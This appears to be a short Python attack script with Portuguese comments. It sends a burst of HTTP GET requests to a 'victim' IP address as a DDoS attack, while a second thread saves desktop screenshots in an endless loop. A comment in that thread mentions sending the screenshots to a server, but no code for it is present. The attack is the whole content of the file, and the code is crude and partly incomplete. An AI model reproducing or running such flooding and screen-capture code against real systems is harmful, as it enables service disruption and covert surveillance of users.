import socket
import threading
import pyscreenshot as ImageGrab
#Você precisa ter instalado a biblioteca pyscreenshot



#Substitua pelo endereço IP da vítima
target_ip = "192.168.1.100"
target_port = 80  # Aqui você define: Porta de destino do ataque
max_requests = 100  #Aqui você define: Número máximo de solicitações

def ddos_attack():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    message = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(target_ip)

    for _ in range(max_requests):
        client.send(message.encode())

    client.close()

def take_screenshot():
    while True:
        
#Captura e salva o screenshot da área de trabalho
        screenshot = ImageGrab.grab()
        screenshot.save("screenshot.png")
#Envie o arquivo de screenshot para o servidor

#Você deve criar uma thread para o ataque DDoS
ddos_thread = threading.Thread(target=ddos_attack)
ddos_thread.start()

#Também crie uma thread para tirar as suas  screenshots
screenshot_thread = threading.Thread(target=take_screenshot)
screenshot_thread.start()

ddos_thread.join()




#make by LucasStevan (http://linkedin.com/in/infoseclucasoliveira)
